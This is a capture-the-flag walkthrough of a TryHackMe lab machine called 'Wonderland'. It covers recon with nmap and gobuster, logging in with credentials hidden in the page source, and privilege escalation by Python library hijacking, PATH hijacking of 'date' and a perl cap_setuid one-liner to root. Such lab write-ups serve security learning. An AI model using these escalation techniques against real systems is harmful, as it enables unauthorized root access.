# [Wonderland [medium]](https://tryhackme.com/room/lookingglass)

# Recon:

## nmap

```
>>> nmap -sC -sV 10.10.130.186
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-31 11:08 CET
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.48 seconds

>>> nmap -sC -sV -Pn 10.10.130.186
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-31 11:09 CET
Nmap scan report for 10.10.130.186
Host is up (0.056s latency).
All 1000 scanned ports on 10.10.130.186 are closed

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.03 seconds
```
Seems like we can't scan the machine because when I add the IP on internet, I have this website:

![Alt text](https://i.imgur.com/lRgLomH.png)

So we know that the port 80 is opened.

looking a bit more at the page we can see that the image is stored at: `http://IP/img/white_rabbit_1.jpg`

And on the directory `/img/` we can find two others images:

![Alt text](https://i.imgur.com/MD7LaXf.png)

After some analyze on the images I didn't find anything interesting so let's enum the subdirecotries of the website.

## directory enum

After a lot of tries nothing works so I had decided to bruteforce the url:

```py
import string
import itertools
words = []
for i in itertools.product(string.ascii_lowercase, repeat=1):
    words.append(''.join(i))
for i in itertools.product(string.ascii_lowercase, repeat=2):
    words.append(''.join(i))
for i in itertools.product(string.ascii_lowercase, repeat=3):
    words.append(''.join(i))
for i in itertools.product(string.ascii_lowercase, repeat=4):
    words.append(''.join(i))
for i in itertools.product(string.ascii_lowercase, repeat=5):
    words.append(''.join(i))
open('words.txt', 'w').write('\n'.join(words))
```
I know that the code is garbage but I didn't wanted to take that much time making it.

```
>>> gobuster  -u 10.10.130.186 -w words.txt 


=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.130.186/
[+] Threads      : 10
[+] Wordlist     : words.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2024/01/31 11:29:06 Starting gobuster
=====================================================
/r (Status: 301)
Progress: 735 / 12356630 (0.01%)
```
looking at `http://IP/r/` we find this page:

![Alt text](https://i.imgur.com/8JMpMVM.png)

After some easy guessing we access this page: `http://IP/r/a/b/b/i/t/`

![Alt text](https://i.imgur.com/coINzw6.png)

looking at the source code of the webpage we find some credentials

```html

<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>
```

Let's hope ssh is oppened and try to connect to it with those creds:

```
ssh alice@10.10.130.186               
The authenticity of host '10.10.130.186 (10.10.130.186)' can't be established.
ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.130.186' (ED25519) to the list of known hosts.
alice@10.10.130.186's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 31 10:33:49 UTC 2024

  System load:  0.0                Processes:           84
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 28%                IP address for eth0: 10.10.130.186
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ 
```
Bingo ! we are in.

## PrivEsc

```
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

alice@wonderland:~$ cat /home/alice/walrus_and_the_carpenter.py
import random
poem = """The sun was shining on the sea,
Shining with all his might:
...
...
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```
something interesting is that the script import random. Let's make our own malicious `random.py`:
```py
import os

os.system("/bin/bash")
```

```
alice@wonderland:~$ vim random.py
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
alice@wonderland:~$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```
After some enumeration, I have found an interesting binnary on `rabbit` home:
```
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Wed, 31 Jan 2024 11:43:36 +0000
Ask very nicely, and I will give you some tea while you wait for him

Segmentation fault (core dumped)
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Wed, 31 Jan 2024 11:43:44 +0000
Ask very nicely, and I will give you some tea while you wait for him

Segmentation fault (core dumped)
rabbit@wonderland:/home/rabbit$ find / -name date 2>/dev/null 
/sys/devices/pnp0/00:02/rtc/rtc0/date
/usr/lib/byobu/date
/bin/date
```
I think it uses `/bin/date` so let's try to make our own malicious one.
We will add `/tmp` to the path, and make our own date so when it will call date the `tmp` path will be called before `bin` and so our code will be executed.

our malicious date:
```sh
#!/bin/bash
/bin/bash
```

```
rabbit@wonderland:/home/rabbit$ export PATH=/tmp:$PATH
rabbit@wonderland:/home/rabbit$ vim /tmp/date
rabbit@wonderland:/home/rabbit$ chmod +x /tmp/date
rabbit@wonderland:/home/rabbit$ ./teaParty please
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```
And now, we are `hatter`.
```
hatter@wonderland:/home$ cd hatter/
hatter@wonderland:/home/hatter$ ls
password.txt
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?
```
Now, we have the creds of hatter so let's connect to it using ssh:
```
>>> ssh hatter@10.10.130.186
hatter@10.10.130.186's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 31 10:55:42 UTC 2024

  System load:  0.05               Processes:           84
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 34%                IP address for eth0: 10.10.130.186
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

hatter@wonderland:~$
```
running [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) we can see:
```
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
```

Looking at perl on [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) we can see this:

![Alt text](https://i.imgur.com/m6f66A7.png)

```
hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```
